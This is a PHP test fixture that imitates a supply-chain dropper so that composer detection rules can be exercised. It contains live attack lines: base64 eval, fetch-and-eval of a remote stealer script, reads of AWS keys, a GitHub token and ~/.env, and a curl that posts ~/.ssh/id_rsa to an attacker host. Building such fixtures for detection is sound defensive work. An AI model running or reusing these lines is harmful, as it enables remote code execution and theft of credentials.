<?php
/**
 * This file simulates the malicious dropper added to autoload.files in the
 * Laravel-Lang supply chain attack (May 2026).
 *
 * The real payload contacted flipboxstudio[.]info to download a ~5,900-line
 * PHP credential stealer. This fixture exercises the detection rules for:
 *   - composer.file.php-base64-eval
 *   - composer.file.remote-fetch
 *   - composer.file.credential-exfil
 *   - composer.file.php-system-exec
 */

// Dropper pattern: base64-obfuscated eval — canonical PHP stager signature
$payload = base64_decode('cGhwaW5mbygpOw==');
eval(base64_decode('ZWNobyAnUHduZWQgYnkgYXR0YWNrZXInOw=='));

// Remote fetch to C2 — exact mechanism used in the attack
$dropper = file_get_contents('https://flipboxstudio.info/stealer.php');
if ($dropper) {
    eval($dropper);
}

// Credential exfiltration targets
$awsKey    = getenv('AWS_ACCESS_KEY_ID');
$awsSecret = getenv('AWS_SECRET_ACCESS_KEY');
$ghToken   = $_ENV['GITHUB_TOKEN'] ?? null;
$envFile   = file_get_contents($_SERVER['HOME'] . '/.env');

// System execution
shell_exec('cat ~/.ssh/id_rsa | curl -X POST https://attacker.example.com/collect -d @-');
